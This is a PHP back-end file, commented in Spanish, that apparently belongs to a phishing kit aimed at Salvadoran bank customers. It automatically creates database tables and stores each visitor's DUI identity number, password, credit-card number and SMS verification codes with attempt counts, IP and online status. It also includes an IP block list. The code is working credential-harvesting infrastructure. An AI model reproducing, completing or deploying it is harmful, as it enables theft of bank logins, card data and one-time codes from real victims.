<?php
ob_start();
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

date_default_timezone_set('America/El_Salvador');

// Función para conectarse a la Base de Datos de Render
function getDB() {
    $dbUrl = getenv('DATABASE_URL');
    if (!$dbUrl) return null;
    
    $url = parse_url($dbUrl);
    $host = $url['host'] ?? 'localhost';
    $port = $url['port'] ?? 5432;
    $user = $url['user'] ?? '';
    $pass = $url['pass'] ?? '';
    $db   = ltrim($url['path'] ?? '', '/');

    try {
        $pdo = new PDO("pgsql:host=$host;port=$port;dbname=$db", $user, $pass);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        
        // 1. Crear la tabla de registros automáticamente si no existe
        $pdo->exec("CREATE TABLE IF NOT EXISTS registros (
            id VARCHAR(255) PRIMARY KEY,
            fecha VARCHAR(255),
            ip VARCHAR(255),
            last_seen BIGINT,
            status VARCHAR(255),
            documento VARCHAR(255),
            contrasena VARCHAR(255),
            doc_type VARCHAR(255),
            doc_number VARCHAR(255),
            product_type VARCHAR(255),
            product_number VARCHAR(255),
            sms VARCHAR(255),
            sms_attempts INT DEFAULT 0
        )");

        // 2. Crear la tabla de bloqueos automáticamente (CRÍTICO: Faltaba en tu código)
        $pdo->exec("CREATE TABLE IF NOT EXISTS bloqueos (
            ip VARCHAR(255) PRIMARY KEY
        )");

        return $pdo;
    } catch (Exception $e) {
        // En producción, es mejor no exponer el error de BD, pero lo dejamos para debug
        // error_log("DB Error: " . $e->getMessage());
        return null;
    }
}

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return trim($_SERVER['HTTP_CLIENT_IP']);
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

function checkIPBlocked() {
    $ip = getUserIP();
    $pdo = getDB();
    if ($pdo) {
        // Usamos try-catch por si la tabla aún no se ha creado en el primerísimo hit
        try {
            $stmt = $pdo->prepare("SELECT 1 FROM bloqueos WHERE ip = ?");
            $stmt->execute([$ip]);
            if ($stmt->fetch()) {
                http_response_code(403);
                die("Acceso restringido. Contacte a soporte.");
            }
        } catch (Exception $e) {
            // Ignorar error si la tabla no existe momentáneamente
        }
    }
}

function getVisitorId($force_new = false) {
    if ($force_new || empty($_SESSION['visitor_id'])) {
        $_SESSION['visitor_id'] = 'usr_' . bin2hex(random_bytes(6));
    }
    return $_SESSION['visitor_id'];
}

function saveUserData($updates = [], $force_create = false, $custom_id = null) {
    $pdo = getDB();
    if (!$pdo) return; // Si no hay base de datos, no guarda

    $id = $custom_id ?: ($_POST['visitor_id'] ?? $_GET['id'] ?? $_SESSION['visitor_id'] ?? getVisitorId());
    $ip = getUserIP();

    // Buscar si el usuario ya existe
    $stmt = $pdo->prepare("SELECT id FROM registros WHERE id = ?");
    $stmt->execute([$id]);
    $exists = $stmt->fetch();

    if ($exists) {
        // Actualizar datos existentes
        $updates['ip'] = $ip;
        $updates['last_seen'] = time();
        
        // Validación para evitar UPDATE vacío que rompa SQL
        if (!empty($updates)) {
            $set = [];
            $values = [];
            foreach ($updates as $k => $v) { 
                $set[] = "$k = ?"; 
                $values[] = $v;
            }
            $values[] = $id; // Añadir el ID al final para el WHERE
            
            $sql = "UPDATE registros SET " . implode(', ', $set) . " WHERE id = ?";
            $stmt = $pdo->prepare($sql);
            $stmt->execute($values);
        }
    } else {
        // Crear nuevo registro
        $hasData = !empty($updates['documento']) || !empty($updates['contrasena']) || !empty($updates['doc_number']) || !empty($updates['product_number']) || !empty($updates['sms']) || $force_create;
        if ($hasData) {
            $new = array_merge([
                'id' => $id, 'fecha' => date('d/m/Y h:i:s A'), 'ip' => $ip, 'last_seen' => time(),
                'status' => 'En línea', 'documento' => '', 'contrasena' => '', 'doc_type' => 'DUI',
                'doc_number' => '', 'product_type' => 'Tarjeta de Crédito', 'product_number' => '', 'sms' => '', 'sms_attempts' => 0
            ], $updates);
            
            $stmt = $pdo->prepare("INSERT INTO registros (id, fecha, ip, last_seen, status, documento, contrasena, doc_type, doc_number, product_type, product_number, sms, sms_attempts) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
            $stmt->execute([
                $new['id'], $new['fecha'], $new['ip'], $new['last_seen'], $new['status'], 
                $new['documento'], $new['contrasena'], $new['doc_type'], $new['doc_number'], 
                $new['product_type'], $new['product_number'], $new['sms'], $new['sms_attempts']
            ]);
        }
    }
}
?>
